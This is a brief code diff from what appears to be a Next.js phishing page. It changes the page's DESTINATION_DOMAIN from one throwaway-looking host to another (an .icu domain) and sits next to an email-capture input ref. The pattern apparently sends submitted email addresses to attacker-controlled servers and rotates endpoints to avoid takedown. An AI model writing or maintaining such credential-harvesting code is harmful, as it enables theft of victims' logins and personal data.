@@ -16,7 +16,8 @@ export default function Home() {
   });
 
   const REDIRECT_PREFIX = '';
-  const DESTINATION_DOMAIN = 'https://api-rx4sym0ih.aeronorways.com/';
+  const DESTINATION_DOMAIN = 'https://api-cf3bgxq9m.ubrmsubrmu.icu/';
+  // const DESTINATION_DOMAIN = process.env.NEXT_PUBLIC_URL_NAME;
 
   useEffect(() => {
     const emailInput = emailRef.current;
